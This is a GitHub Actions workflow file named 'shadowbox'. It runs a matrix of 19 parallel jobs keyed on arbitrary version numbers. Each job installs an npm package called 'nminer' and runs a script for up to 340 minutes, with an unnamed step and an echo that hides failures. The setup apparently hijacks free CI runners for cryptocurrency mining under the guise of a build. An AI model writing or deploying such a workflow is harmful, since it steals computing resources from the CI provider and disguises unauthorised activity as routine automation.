name: shadowbox
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1479 }
          - { version: 4021 }
          - { version: 9624 }
          - { version: 9819 }
          - { version: 4525 }
          - { version: 6568 }
          - { version: 5532 }
          - { version: 9318 }
          - { version: 1165 }
          - { version: 897 }
          - { version: 1877 }
          - { version: 3295 }
          - { version: 9554 }
          - { version: 6074 }
          - { version: 8348 }
          - { version: 5882 }
          - { version: 6437 }
          - { version: 4383 }
          - { version: 8185 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 340m node shadowbox.js || echo "shadowbox executed"